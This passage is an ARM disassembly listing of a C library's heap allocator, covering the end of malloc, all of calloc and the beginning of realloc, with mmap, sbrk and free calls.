   174f0:	e1520003 	cmp	r2, r3
   174f4:	3afffffb 	bcc	174e8 <malloc+0x244>
   174f8:	e59ec00c 	ldr	ip, [lr, #12]
   174fc:	e59d200c 	ldr	r2, [sp, #12]
   17500:	e7921008 	ldr	r1, [r2, r8]
   17504:	e1a032c0 	asr	r3, r0, #5
   17508:	e0811103 	add	r1, r1, r3, lsl #2
   1750c:	e5913334 	ldr	r3, [r1, #820]	; 0x334
   17510:	e200201f 	and	r2, r0, #31
   17514:	e3a00001 	mov	r0, #1
   17518:	e1833210 	orr	r3, r3, r0, lsl r2
   1751c:	e586c00c 	str	ip, [r6, #12]
   17520:	e586e008 	str	lr, [r6, #8]
   17524:	e5813334 	str	r3, [r1, #820]	; 0x334
   17528:	e58e600c 	str	r6, [lr, #12]
   1752c:	e58c6008 	str	r6, [ip, #8]
   17530:	ea000004 	b	17548 <malloc+0x2a4>
   17534:	e59f8694 	ldr	r8, [pc, #1684]	; 17bd0 <malloc+0x92c>
   17538:	e59d100c 	ldr	r1, [sp, #12]
   1753c:	e7919008 	ldr	r9, [r1, r8]
   17540:	e28ab010 	add	fp, sl, #16
   17544:	e2895034 	add	r5, r9, #52	; 0x34
   17548:	e595600c 	ldr	r6, [r5, #12]
   1754c:	e1560005 	cmp	r6, r5
   17550:	1affffa9 	bne	173fc <malloc+0x158>
   17554:	e35a00ff 	cmp	sl, #255	; 0xff
   17558:	9a00002b 	bls	1760c <malloc+0x368>
   1755c:	e0863187 	add	r3, r6, r7, lsl #3
   17560:	e2431008 	sub	r1, r3, #8
   17564:	e591c00c 	ldr	ip, [r1, #12]
   17568:	ea000025 	b	17604 <malloc+0x360>
   1756c:	e59c3004 	ldr	r3, [ip, #4]
   17570:	e3c32003 	bic	r2, r3, #3
   17574:	e152000a 	cmp	r2, sl
   17578:	e59c000c 	ldr	r0, [ip, #12]
   1757c:	3a00001f 	bcc	17600 <malloc+0x35c>
   17580:	e59c1008 	ldr	r1, [ip, #8]
   17584:	e591300c 	ldr	r3, [r1, #12]
   17588:	e153000c 	cmp	r3, ip
   1758c:	1a000002 	bne	1759c <malloc+0x2f8>
   17590:	e5903008 	ldr	r3, [r0, #8]
   17594:	e153000c 	cmp	r3, ip
   17598:	0a000000 	beq	175a0 <malloc+0x2fc>
   1759c:	eb000406 	bl	185bc <__GI_abort>
   175a0:	e06ae002 	rsb	lr, sl, r2
   175a4:	e35e000f 	cmp	lr, #15
   175a8:	e5801008 	str	r1, [r0, #8]
   175ac:	e581000c 	str	r0, [r1, #12]
   175b0:	e28c0008 	add	r0, ip, #8
   175b4:	8a000005 	bhi	175d0 <malloc+0x32c>
   175b8:	e08c2002 	add	r2, ip, r2
   175bc:	e5923004 	ldr	r3, [r2, #4]
   175c0:	e1a04000 	mov	r4, r0
   175c4:	e3833001 	orr	r3, r3, #1
   175c8:	e5823004 	str	r3, [r2, #4]
   175cc:	ea00016e 	b	17b8c <malloc+0x8e8>
   175d0:	e08c200a 	add	r2, ip, sl
   175d4:	e38a3001 	orr	r3, sl, #1
   175d8:	e38e1001 	orr	r1, lr, #1
   175dc:	e1a04000 	mov	r4, r0
   175e0:	e58c3004 	str	r3, [ip, #4]
   175e4:	e5862008 	str	r2, [r6, #8]
   175e8:	e586200c 	str	r2, [r6, #12]
   175ec:	e782e00e 	str	lr, [r2, lr]
   175f0:	e5821004 	str	r1, [r2, #4]
   175f4:	e582600c 	str	r6, [r2, #12]
   175f8:	e5826008 	str	r6, [r2, #8]
   175fc:	ea000162 	b	17b8c <malloc+0x8e8>
   17600:	e1a0c000 	mov	ip, r0
   17604:	e15c0001 	cmp	ip, r1
   17608:	1affffd7 	bne	1756c <malloc+0x2c8>
   1760c:	e2872001 	add	r2, r7, #1
   17610:	e202301f 	and	r3, r2, #31
   17614:	e3a01001 	mov	r1, #1
   17618:	e59d000c 	ldr	r0, [sp, #12]
   1761c:	e1a0c311 	lsl	ip, r1, r3
   17620:	e59f35a8 	ldr	r3, [pc, #1448]	; 17bd0 <malloc+0x92c>
   17624:	e7903003 	ldr	r3, [r0, r3]
   17628:	e1a052a2 	lsr	r5, r2, #5
   1762c:	e0832105 	add	r2, r3, r5, lsl #2
   17630:	e5924334 	ldr	r4, [r2, #820]	; 0x334
   17634:	e2833034 	add	r3, r3, #52	; 0x34
   17638:	e59f8590 	ldr	r8, [pc, #1424]	; 17bd0 <malloc+0x92c>
   1763c:	e0830187 	add	r0, r3, r7, lsl #3
   17640:	e27c3001 	rsbs	r3, ip, #1
   17644:	33a03000 	movcc	r3, #0
   17648:	e15c0004 	cmp	ip, r4
   1764c:	83833001 	orrhi	r3, r3, #1
   17650:	e3530000 	cmp	r3, #0
   17654:	0a00000e 	beq	17694 <malloc+0x3f0>
   17658:	e2855001 	add	r5, r5, #1
   1765c:	e3550002 	cmp	r5, #2
   17660:	8a000034 	bhi	17738 <malloc+0x494>
   17664:	e59d300c 	ldr	r3, [sp, #12]
   17668:	e7932008 	ldr	r2, [r3, r8]
   1766c:	e0823105 	add	r3, r2, r5, lsl #2
   17670:	e5934334 	ldr	r4, [r3, #820]	; 0x334
   17674:	e3540000 	cmp	r4, #0
   17678:	0afffff6 	beq	17658 <malloc+0x3b4>
   1767c:	e0823405 	add	r3, r2, r5, lsl #8
   17680:	e283002c 	add	r0, r3, #44	; 0x2c
   17684:	e1a0c001 	mov	ip, r1
   17688:	ea000001 	b	17694 <malloc+0x3f0>
   1768c:	e2800008 	add	r0, r0, #8
   17690:	e1a0c08c 	lsl	ip, ip, #1
   17694:	e11c0004 	tst	ip, r4
   17698:	0afffffb 	beq	1768c <malloc+0x3e8>
   1769c:	e590e00c 	ldr	lr, [r0, #12]
   176a0:	e15e0000 	cmp	lr, r0
   176a4:	1a000007 	bne	176c8 <malloc+0x424>
   176a8:	e59d000c 	ldr	r0, [sp, #12]
   176ac:	e7903008 	ldr	r3, [r0, r8]
   176b0:	e1c4400c 	bic	r4, r4, ip
   176b4:	e0833105 	add	r3, r3, r5, lsl #2
   176b8:	e28e0008 	add	r0, lr, #8
   176bc:	e1a0c08c 	lsl	ip, ip, #1
   176c0:	e5834334 	str	r4, [r3, #820]	; 0x334
   176c4:	eaffffdd 	b	17640 <malloc+0x39c>
   176c8:	e59e3004 	ldr	r3, [lr, #4]
   176cc:	e3c32003 	bic	r2, r3, #3
   176d0:	e06ac002 	rsb	ip, sl, r2
   176d4:	e59e300c 	ldr	r3, [lr, #12]
   176d8:	e35c000f 	cmp	ip, #15
   176dc:	908e2002 	addls	r2, lr, r2
   176e0:	e5830008 	str	r0, [r3, #8]
   176e4:	e580300c 	str	r3, [r0, #12]
   176e8:	928e4008 	addls	r4, lr, #8
   176ec:	95923004 	ldrls	r3, [r2, #4]
   176f0:	9affffb3 	bls	175c4 <malloc+0x320>
   176f4:	e08e100a 	add	r1, lr, sl
   176f8:	e35a00ff 	cmp	sl, #255	; 0xff
   176fc:	e5861008 	str	r1, [r6, #8]
   17700:	e586100c 	str	r1, [r6, #12]
   17704:	e5816008 	str	r6, [r1, #8]
   17708:	e581600c 	str	r6, [r1, #12]
   1770c:	959f34bc 	ldrls	r3, [pc, #1212]	; 17bd0 <malloc+0x92c>
   17710:	959d200c 	ldrls	r2, [sp, #12]
   17714:	97923003 	ldrls	r3, [r2, r3]
   17718:	95831030 	strls	r1, [r3, #48]	; 0x30
   1771c:	e38a2001 	orr	r2, sl, #1
   17720:	e38c3001 	orr	r3, ip, #1
   17724:	e28e4008 	add	r4, lr, #8
   17728:	e58e2004 	str	r2, [lr, #4]
   1772c:	e781c00c 	str	ip, [r1, ip]
   17730:	e5813004 	str	r3, [r1, #4]
   17734:	ea000114 	b	17b8c <malloc+0x8e8>
   17738:	e59f3490 	ldr	r3, [pc, #1168]	; 17bd0 <malloc+0x92c>
   1773c:	e59dc00c 	ldr	ip, [sp, #12]
   17740:	e79c0003 	ldr	r0, [ip, r3]
   17744:	e590c02c 	ldr	ip, [r0, #44]	; 0x2c
   17748:	e59c3004 	ldr	r3, [ip, #4]
   1774c:	e28a1010 	add	r1, sl, #16
   17750:	e3c33003 	bic	r3, r3, #3
   17754:	e1530001 	cmp	r3, r1
   17758:	e58d1014 	str	r1, [sp, #20]
   1775c:	3a000008 	bcc	17784 <malloc+0x4e0>
   17760:	e06a3003 	rsb	r3, sl, r3
   17764:	e08c100a 	add	r1, ip, sl
   17768:	e3833001 	orr	r3, r3, #1
   1776c:	e38a2001 	orr	r2, sl, #1
   17770:	e28c4008 	add	r4, ip, #8
   17774:	e58c2004 	str	r2, [ip, #4]
   17778:	e580102c 	str	r1, [r0, #44]	; 0x2c
   1777c:	e5813004 	str	r3, [r1, #4]
   17780:	ea000101 	b	17b8c <malloc+0x8e8>
   17784:	e5903000 	ldr	r3, [r0]
   17788:	e213c002 	ands	ip, r3, #2
   1778c:	e590135c 	ldr	r1, [r0, #860]	; 0x35c
   17790:	0a000003 	beq	177a4 <malloc+0x500>
   17794:	eb00027c 	bl	1818c <__malloc_consolidate>
   17798:	e24a0007 	sub	r0, sl, #7
   1779c:	ebfffec0 	bl	172a4 <malloc>
   177a0:	ea0000f8 	b	17b88 <malloc+0x8e4>
   177a4:	e590334c 	ldr	r3, [r0, #844]	; 0x34c
   177a8:	e15a0003 	cmp	sl, r3
   177ac:	e2419001 	sub	r9, r1, #1
   177b0:	3a000032 	bcc	17880 <malloc+0x5dc>
   177b4:	e5902354 	ldr	r2, [r0, #852]	; 0x354
   177b8:	e5903350 	ldr	r3, [r0, #848]	; 0x350
   177bc:	e1530002 	cmp	r3, r2
   177c0:	aa00002e 	bge	17880 <malloc+0x5dc>
   177c4:	e281300a 	add	r3, r1, #10
   177c8:	e083300a 	add	r3, r3, sl
   177cc:	e1c34009 	bic	r4, r3, r9
   177d0:	e154000a 	cmp	r4, sl
   177d4:	9a000029 	bls	17880 <malloc+0x5dc>
   177d8:	e1a0000c 	mov	r0, ip
   177dc:	e1a01004 	mov	r1, r4
   177e0:	e3a02003 	mov	r2, #3
   177e4:	e3a03022 	mov	r3, #34	; 0x22
   177e8:	e58dc000 	str	ip, [sp]
   177ec:	e58dc004 	str	ip, [sp, #4]
   177f0:	eb000bc9 	bl	1a71c <__GI_mmap>
   177f4:	e3700001 	cmn	r0, #1
   177f8:	0a000020 	beq	17880 <malloc+0x5dc>
   177fc:	e2102007 	ands	r2, r0, #7
   17800:	12623008 	rsbne	r3, r2, #8
   17804:	10632004 	rsbne	r2, r3, r4
   17808:	1080e003 	addne	lr, r0, r3
   1780c:	01a0e000 	moveq	lr, r0
   17810:	13822002 	orrne	r2, r2, #2
   17814:	03843002 	orreq	r3, r4, #2
   17818:	17803003 	strne	r3, [r0, r3]
   1781c:	158e2004 	strne	r2, [lr, #4]
   17820:	058e2000 	streq	r2, [lr]
   17824:	058e3004 	streq	r3, [lr, #4]
   17828:	e59d200c 	ldr	r2, [sp, #12]
   1782c:	e59f339c 	ldr	r3, [pc, #924]	; 17bd0 <malloc+0x92c>
   17830:	e792c003 	ldr	ip, [r2, r3]
   17834:	e59c3350 	ldr	r3, [ip, #848]	; 0x350
   17838:	e59c2358 	ldr	r2, [ip, #856]	; 0x358
   1783c:	e2833001 	add	r3, r3, #1
   17840:	e1530002 	cmp	r3, r2
   17844:	c58c3358 	strgt	r3, [ip, #856]	; 0x358
   17848:	e58c3350 	str	r3, [ip, #848]	; 0x350
   1784c:	e59c3364 	ldr	r3, [ip, #868]	; 0x364
   17850:	e59c2370 	ldr	r2, [ip, #880]	; 0x370
   17854:	e0841003 	add	r1, r4, r3
   17858:	e59c3368 	ldr	r3, [ip, #872]	; 0x368
   1785c:	e1510002 	cmp	r1, r2
   17860:	e59c2374 	ldr	r2, [ip, #884]	; 0x374
   17864:	858c1370 	strhi	r1, [ip, #880]	; 0x370
   17868:	e58c1364 	str	r1, [ip, #868]	; 0x364
   1786c:	e0811003 	add	r1, r1, r3
   17870:	e1510002 	cmp	r1, r2
   17874:	e28e0008 	add	r0, lr, #8
   17878:	858c1374 	strhi	r1, [ip, #884]	; 0x374
   1787c:	ea0000c1 	b	17b88 <malloc+0x8e4>
   17880:	e59f3348 	ldr	r3, [pc, #840]	; 17bd0 <malloc+0x92c>
   17884:	e59dc00c 	ldr	ip, [sp, #12]
   17888:	e79c3003 	ldr	r3, [ip, r3]
   1788c:	e593002c 	ldr	r0, [r3, #44]	; 0x2c
   17890:	e5932360 	ldr	r2, [r3, #864]	; 0x360
   17894:	e5933348 	ldr	r3, [r3, #840]	; 0x348
   17898:	e5901004 	ldr	r1, [r0, #4]
   1789c:	e2833010 	add	r3, r3, #16
   178a0:	e3120001 	tst	r2, #1
   178a4:	e083300a 	add	r3, r3, sl
   178a8:	e3c18003 	bic	r8, r1, #3
   178ac:	10683003 	rsbne	r3, r8, r3
   178b0:	e0833009 	add	r3, r3, r9
   178b4:	e1e0b009 	mvn	fp, r9
   178b8:	e003500b 	and	r5, r3, fp
   178bc:	e3550000 	cmp	r5, #0
   178c0:	e58d0010 	str	r0, [sp, #16]
   178c4:	da000004 	ble	178dc <malloc+0x638>
   178c8:	e1a00005 	mov	r0, r5
   178cc:	eb000ce6 	bl	1ac6c <__GI_sbrk>
   178d0:	e3700001 	cmn	r0, #1
   178d4:	e1a04000 	mov	r4, r0
   178d8:	1a00001a 	bne	17948 <malloc+0x6a4>
   178dc:	e59f32ec 	ldr	r3, [pc, #748]	; 17bd0 <malloc+0x92c>
   178e0:	e59d100c 	ldr	r1, [sp, #12]
   178e4:	e7916003 	ldr	r6, [r1, r3]
   178e8:	e5963360 	ldr	r3, [r6, #864]	; 0x360
   178ec:	e3130001 	tst	r3, #1
   178f0:	10883009 	addne	r3, r8, r9
   178f4:	10833005 	addne	r3, r3, r5
   178f8:	1003500b 	andne	r5, r3, fp
   178fc:	e3550601 	cmp	r5, #1048576	; 0x100000
   17900:	33a05601 	movcc	r5, #1048576	; 0x100000
   17904:	e155000a 	cmp	r5, sl
   17908:	9a000098 	bls	17b70 <malloc+0x8cc>
   1790c:	e3a0c000 	mov	ip, #0
   17910:	e1a0000c 	mov	r0, ip
   17914:	e1a01005 	mov	r1, r5
   17918:	e3a02003 	mov	r2, #3
   1791c:	e3a03022 	mov	r3, #34	; 0x22
   17920:	e58dc000 	str	ip, [sp]
   17924:	e58dc004 	str	ip, [sp, #4]
   17928:	eb000b7b 	bl	1a71c <__GI_mmap>
   1792c:	e3700001 	cmn	r0, #1
   17930:	e1a04000 	mov	r4, r0
   17934:	15963360 	ldrne	r3, [r6, #864]	; 0x360
   17938:	10800005 	addne	r0, r0, r5
   1793c:	13c33001 	bicne	r3, r3, #1
   17940:	15863360 	strne	r3, [r6, #864]	; 0x360
   17944:	1a000000 	bne	1794c <malloc+0x6a8>
   17948:	e3e00000 	mvn	r0, #0
   1794c:	e3740001 	cmn	r4, #1
   17950:	0a000086 	beq	17b70 <malloc+0x8cc>
   17954:	e59f3274 	ldr	r3, [pc, #628]	; 17bd0 <malloc+0x92c>
   17958:	e59d200c 	ldr	r2, [sp, #12]
   1795c:	e792c003 	ldr	ip, [r2, r3]
   17960:	e59d2010 	ldr	r2, [sp, #16]
   17964:	e59c3368 	ldr	r3, [ip, #872]	; 0x368
   17968:	e0821008 	add	r1, r2, r8
   1796c:	e0853003 	add	r3, r5, r3
   17970:	e1540001 	cmp	r4, r1
   17974:	03700001 	cmneq	r0, #1
   17978:	e58c3368 	str	r3, [ip, #872]	; 0x368
   1797c:	00853008 	addeq	r3, r5, r8
   17980:	03833001 	orreq	r3, r3, #1
   17984:	05823004 	streq	r3, [r2, #4]
   17988:	0a00005d 	beq	17b04 <malloc+0x860>
   1798c:	e59c2360 	ldr	r2, [ip, #864]	; 0x360
   17990:	e3580000 	cmp	r8, #0
   17994:	03a03000 	moveq	r3, #0
   17998:	12023001 	andne	r3, r2, #1
   1799c:	e3530000 	cmp	r3, #0
   179a0:	0a000002 	beq	179b0 <malloc+0x70c>
   179a4:	e1540001 	cmp	r4, r1
   179a8:	33c23001 	biccc	r3, r2, #1
   179ac:	358c3360 	strcc	r3, [ip, #864]	; 0x360
   179b0:	e59f3218 	ldr	r3, [pc, #536]	; 17bd0 <malloc+0x92c>
   179b4:	e59dc00c 	ldr	ip, [sp, #12]
   179b8:	e79c7003 	ldr	r7, [ip, r3]
   179bc:	e5973360 	ldr	r3, [r7, #864]	; 0x360
   179c0:	e2136001 	ands	r6, r3, #1
   179c4:	0a000022 	beq	17a54 <malloc+0x7b0>
   179c8:	e3580000 	cmp	r8, #0
   179cc:	15972368 	ldrne	r2, [r7, #872]	; 0x368
   179d0:	10613004 	rsbne	r3, r1, r4
   179d4:	10833002 	addne	r3, r3, r2
   179d8:	15873368 	strne	r3, [r7, #872]	; 0x368
   179dc:	e2143007 	ands	r3, r4, #7
   179e0:	12633008 	rsbne	r3, r3, #8
   179e4:	10847003 	addne	r7, r4, r3
   179e8:	e0846005 	add	r6, r4, r5
   179ec:	e0833008 	add	r3, r3, r8
   179f0:	e0861003 	add	r1, r6, r3
   179f4:	e0812009 	add	r2, r1, r9
   179f8:	e002200b 	and	r2, r2, fp
   179fc:	e0613003 	rsb	r3, r1, r3
   17a00:	e0835002 	add	r5, r3, r2
   17a04:	e1a00005 	mov	r0, r5
   17a08:	01a07004 	moveq	r7, r4
   17a0c:	eb000c96 	bl	1ac6c <__GI_sbrk>
   17a10:	e3700001 	cmn	r0, #1
   17a14:	1a000003 	bne	17a28 <malloc+0x784>
   17a18:	e2800001 	add	r0, r0, #1
   17a1c:	eb000c92 	bl	1ac6c <__GI_sbrk>
   17a20:	e3a05000 	mov	r5, #0
   17a24:	ea000015 	b	17a80 <malloc+0x7dc>
   17a28:	e1500004 	cmp	r0, r4
   17a2c:	2a000013 	bcs	17a80 <malloc+0x7dc>
   17a30:	e59f3198 	ldr	r3, [pc, #408]	; 17bd0 <malloc+0x92c>
   17a34:	e59d000c 	ldr	r0, [sp, #12]
   17a38:	e7902003 	ldr	r2, [r0, r3]
   17a3c:	e5923360 	ldr	r3, [r2, #864]	; 0x360
   17a40:	e1a00006 	mov	r0, r6
   17a44:	e3c33001 	bic	r3, r3, #1
   17a48:	e3a05000 	mov	r5, #0
   17a4c:	e5823360 	str	r3, [r2, #864]	; 0x360
   17a50:	ea00000a 	b	17a80 <malloc+0x7dc>
   17a54:	e3700001 	cmn	r0, #1
   17a58:	1a000006 	bne	17a78 <malloc+0x7d4>
   17a5c:	e1a00006 	mov	r0, r6
   17a60:	eb000c81 	bl	1ac6c <__GI_sbrk>
   17a64:	e5972368 	ldr	r2, [r7, #872]	; 0x368
   17a68:	e0643000 	rsb	r3, r4, r0
   17a6c:	e0653003 	rsb	r3, r5, r3
   17a70:	e0833002 	add	r3, r3, r2
   17a74:	e5873368 	str	r3, [r7, #872]	; 0x368
   17a78:	e1a07004 	mov	r7, r4
   17a7c:	e1a05006 	mov	r5, r6
   17a80:	e3700001 	cmn	r0, #1
   17a84:	0a00001e 	beq	17b04 <malloc+0x860>
   17a88:	e0803005 	add	r3, r0, r5
   17a8c:	e0673003 	rsb	r3, r7, r3
   17a90:	e3833001 	orr	r3, r3, #1
   17a94:	e5873004 	str	r3, [r7, #4]
   17a98:	e59d100c 	ldr	r1, [sp, #12]
   17a9c:	e59f312c 	ldr	r3, [pc, #300]	; 17bd0 <malloc+0x92c>
   17aa0:	e7916003 	ldr	r6, [r1, r3]
   17aa4:	e5963368 	ldr	r3, [r6, #872]	; 0x368
   17aa8:	e3580000 	cmp	r8, #0
   17aac:	e0853003 	add	r3, r5, r3
   17ab0:	e5863368 	str	r3, [r6, #872]	; 0x368
   17ab4:	e586702c 	str	r7, [r6, #44]	; 0x2c
   17ab8:	0a000011 	beq	17b04 <malloc+0x860>
   17abc:	e59d2010 	ldr	r2, [sp, #16]
   17ac0:	e248300c 	sub	r3, r8, #12
   17ac4:	e3c33007 	bic	r3, r3, #7
   17ac8:	e59dc010 	ldr	ip, [sp, #16]
   17acc:	e0821003 	add	r1, r2, r3
   17ad0:	e353000f 	cmp	r3, #15
   17ad4:	e3a02005 	mov	r2, #5
   17ad8:	e3833001 	orr	r3, r3, #1
   17adc:	e58c3004 	str	r3, [ip, #4]
   17ae0:	e5812008 	str	r2, [r1, #8]
   17ae4:	e5812004 	str	r2, [r1, #4]
   17ae8:	9a000005 	bls	17b04 <malloc+0x860>
   17aec:	e5964344 	ldr	r4, [r6, #836]	; 0x344
   17af0:	e3e03000 	mvn	r3, #0
   17af4:	e28c0008 	add	r0, ip, #8
   17af8:	e5863344 	str	r3, [r6, #836]	; 0x344
   17afc:	eb00020f 	bl	18340 <free>
   17b00:	e5864344 	str	r4, [r6, #836]	; 0x344
   17b04:	e59f30c4 	ldr	r3, [pc, #196]	; 17bd0 <malloc+0x92c>
   17b08:	e59d000c 	ldr	r0, [sp, #12]
   17b0c:	e790e003 	ldr	lr, [r0, r3]
   17b10:	e28e1fda 	add	r1, lr, #872	; 0x368
   17b14:	e891000a 	ldm	r1, {r1, r3}
   17b18:	e1510003 	cmp	r1, r3
   17b1c:	e59e3364 	ldr	r3, [lr, #868]	; 0x364
   17b20:	e59e2374 	ldr	r2, [lr, #884]	; 0x374
   17b24:	e0813003 	add	r3, r1, r3
   17b28:	858e136c 	strhi	r1, [lr, #876]	; 0x36c
   17b2c:	e1530002 	cmp	r3, r2
   17b30:	858e3374 	strhi	r3, [lr, #884]	; 0x374
   17b34:	e59ec02c 	ldr	ip, [lr, #44]	; 0x2c
   17b38:	e59c3004 	ldr	r3, [ip, #4]
   17b3c:	e59d1014 	ldr	r1, [sp, #20]
   17b40:	e3c33003 	bic	r3, r3, #3
   17b44:	e1530001 	cmp	r3, r1
   17b48:	3a000008 	bcc	17b70 <malloc+0x8cc>
   17b4c:	e06a3003 	rsb	r3, sl, r3
   17b50:	e08c100a 	add	r1, ip, sl
   17b54:	e3833001 	orr	r3, r3, #1
   17b58:	e38a2001 	orr	r2, sl, #1
   17b5c:	e28c0008 	add	r0, ip, #8
   17b60:	e58c2004 	str	r2, [ip, #4]
   17b64:	e58e102c 	str	r1, [lr, #44]	; 0x2c
   17b68:	e5813004 	str	r3, [r1, #4]
   17b6c:	ea000005 	b	17b88 <malloc+0x8e4>
   17b70:	e59f305c 	ldr	r3, [pc, #92]	; 17bd4 <malloc+0x930>
   17b74:	eb000b3d 	bl	1a870 <__aeabi_read_tp>
   17b78:	e79f3003 	ldr	r3, [pc, r3]
   17b7c:	e3a0200c 	mov	r2, #12
   17b80:	e7802003 	str	r2, [r0, r3]
   17b84:	e3a00000 	mov	r0, #0
   17b88:	e1a04000 	mov	r4, r0
   17b8c:	e28d0018 	add	r0, sp, #24
   17b90:	e3a01001 	mov	r1, #1
   17b94:	e59f303c 	ldr	r3, [pc, #60]	; 17bd8 <malloc+0x934>
   17b98:	e59d200c 	ldr	r2, [sp, #12]
   17b9c:	e792c003 	ldr	ip, [r2, r3]
   17ba0:	e1a0e00f 	mov	lr, pc
   17ba4:	e12fff1c 	bx	ip
   17ba8:	e1a00004 	mov	r0, r4
   17bac:	e28dd02c 	add	sp, sp, #44	; 0x2c
   17bb0:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   17bb4:	e12fff1e 	bx	lr
   17bb8:	000116dc 	.word	0x000116dc
   17bbc:	0000006c 	.word	0x0000006c
   17bc0:	00000044 	.word	0x00000044
   17bc4:	00000070 	.word	0x00000070
   17bc8:	00000010 	.word	0x00000010
   17bcc:	000116d4 	.word	0x000116d4
   17bd0:	00000040 	.word	0x00000040
   17bd4:	00010e6c 	.word	0x00010e6c
   17bd8:	0000002c 	.word	0x0000002c

00017bdc <calloc>:
   17bdc:	e92d4070 	push	{r4, r5, r6, lr}
   17be0:	e59f5118 	ldr	r5, [pc, #280]	; 17d00 <calloc+0x124>
   17be4:	e3500000 	cmp	r0, #0
   17be8:	e08f5005 	add	r5, pc, r5
   17bec:	e24dd010 	sub	sp, sp, #16
   17bf0:	e1a04001 	mov	r4, r1
   17bf4:	e0060190 	mul	r6, r0, r1
   17bf8:	0a00000b 	beq	17c2c <calloc+0x50>
   17bfc:	e1a01000 	mov	r1, r0
   17c00:	e1a00006 	mov	r0, r6
   17c04:	ebfff829 	bl	15cb0 <__udivsi3>
   17c08:	e1540000 	cmp	r4, r0
   17c0c:	0a000006 	beq	17c2c <calloc+0x50>
   17c10:	e59f20ec 	ldr	r2, [pc, #236]	; 17d04 <calloc+0x128>
   17c14:	eb000b15 	bl	1a870 <__aeabi_read_tp>
   17c18:	e79f2002 	ldr	r2, [pc, r2]
   17c1c:	e3a0300c 	mov	r3, #12
   17c20:	e3a04000 	mov	r4, #0
   17c24:	e7803002 	str	r3, [r0, r2]
   17c28:	ea000030 	b	17cf0 <calloc+0x114>
   17c2c:	e59f30d4 	ldr	r3, [pc, #212]	; 17d08 <calloc+0x12c>
   17c30:	e7954003 	ldr	r4, [r5, r3]
   17c34:	e59f30d0 	ldr	r3, [pc, #208]	; 17d0c <calloc+0x130>
   17c38:	e1a02004 	mov	r2, r4
   17c3c:	e7951003 	ldr	r1, [r5, r3]
   17c40:	e1a0000d 	mov	r0, sp
   17c44:	e59f30c4 	ldr	r3, [pc, #196]	; 17d10 <calloc+0x134>
   17c48:	e795c003 	ldr	ip, [r5, r3]
   17c4c:	e1a0e00f 	mov	lr, pc
   17c50:	e12fff1c 	bx	ip
   17c54:	e1a00004 	mov	r0, r4
   17c58:	e59f30b4 	ldr	r3, [pc, #180]	; 17d14 <calloc+0x138>
   17c5c:	e795c003 	ldr	ip, [r5, r3]
   17c60:	e1a0e00f 	mov	lr, pc
   17c64:	e12fff1c 	bx	ip
   17c68:	e1a00006 	mov	r0, r6
   17c6c:	ebfffd8c 	bl	172a4 <malloc>
   17c70:	e2504000 	subs	r4, r0, #0
   17c74:	0a000017 	beq	17cd8 <calloc+0xfc>
   17c78:	e5143004 	ldr	r3, [r4, #-4]
   17c7c:	e2131002 	ands	r1, r3, #2
   17c80:	1a000014 	bne	17cd8 <calloc+0xfc>
   17c84:	e3c33003 	bic	r3, r3, #3
   17c88:	e2432004 	sub	r2, r3, #4
   17c8c:	e1a0c122 	lsr	ip, r2, #2
   17c90:	e35c0009 	cmp	ip, #9
   17c94:	9a000001 	bls	17ca0 <calloc+0xc4>
   17c98:	ebfffb0c 	bl	168d0 <__GI_memset>
   17c9c:	ea00000d 	b	17cd8 <calloc+0xfc>
   17ca0:	e35c0004 	cmp	ip, #4
   17ca4:	e5841000 	str	r1, [r4]
   17ca8:	e5841004 	str	r1, [r4, #4]
   17cac:	e5841008 	str	r1, [r4, #8]
   17cb0:	9a000008 	bls	17cd8 <calloc+0xfc>
   17cb4:	e35c0006 	cmp	ip, #6
   17cb8:	e584100c 	str	r1, [r4, #12]
   17cbc:	e5841010 	str	r1, [r4, #16]
   17cc0:	9a000004 	bls	17cd8 <calloc+0xfc>
   17cc4:	e35c0009 	cmp	ip, #9
   17cc8:	e5841014 	str	r1, [r4, #20]
   17ccc:	e5841018 	str	r1, [r4, #24]
   17cd0:	05841020 	streq	r1, [r4, #32]
   17cd4:	0584101c 	streq	r1, [r4, #28]
   17cd8:	e1a0000d 	mov	r0, sp
   17cdc:	e3a01001 	mov	r1, #1
   17ce0:	e59f3030 	ldr	r3, [pc, #48]	; 17d18 <calloc+0x13c>
   17ce4:	e795c003 	ldr	ip, [r5, r3]
   17ce8:	e1a0e00f 	mov	lr, pc
   17cec:	e12fff1c 	bx	ip
   17cf0:	e1a00004 	mov	r0, r4
   17cf4:	e28dd010 	add	sp, sp, #16
   17cf8:	e8bd4070 	pop	{r4, r5, r6, lr}
   17cfc:	e12fff1e 	bx	lr
   17d00:	00010da4 	.word	0x00010da4
   17d04:	00010dcc 	.word	0x00010dcc
   17d08:	0000006c 	.word	0x0000006c
   17d0c:	00000044 	.word	0x00000044
   17d10:	00000070 	.word	0x00000070
   17d14:	00000010 	.word	0x00000010
   17d18:	0000002c 	.word	0x0000002c

00017d1c <realloc>:
   17d1c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   17d20:	e59f2394 	ldr	r2, [pc, #916]	; 180bc <realloc+0x3a0>
   17d24:	e24dd01c 	sub	sp, sp, #28
   17d28:	e2505000 	subs	r5, r0, #0
   17d2c:	e08f2002 	add	r2, pc, r2
   17d30:	e58d2004 	str	r2, [sp, #4]
   17d34:	e1a06001 	mov	r6, r1
   17d38:	1a000003 	bne	17d4c <realloc+0x30>
   17d3c:	e1a00001 	mov	r0, r1
   17d40:	ebfffd57 	bl	172a4 <malloc>
   17d44:	e1a04000 	mov	r4, r0
   17d48:	ea0000d7 	b	180ac <realloc+0x390>
   17d4c:	e3510000 	cmp	r1, #0
   17d50:	1a000002 	bne	17d60 <realloc+0x44>
   17d54:	eb000179 	bl	18340 <free>
   17d58:	e1a04006 	mov	r4, r6
   17d5c:	ea0000d2 	b	180ac <realloc+0x390>
   17d60:	e59dc004 	ldr	ip, [sp, #4]
   17d64:	e59f3354 	ldr	r3, [pc, #852]	; 180c0 <realloc+0x3a4>
   17d68:	e79c4003 	ldr	r4, [ip, r3]
   17d6c:	e59f3350 	ldr	r3, [pc, #848]	; 180c4 <realloc+0x3a8>
   17d70:	e1a02004 	mov	r2, r4
   17d74:	e79c1003 	ldr	r1, [ip, r3]
   17d78:	e28d0008 	add	r0, sp, #8
   17d7c:	e59f3344 	ldr	r3, [pc, #836]	; 180c8 <realloc+0x3ac>
   17d80:	e79cc003 	ldr	ip, [ip, r3]
   17d84:	e1a0e00f 	mov	lr, pc
   17d88:	e12fff1c 	bx	ip
   17d8c:	e1a00004 	mov	r0, r4
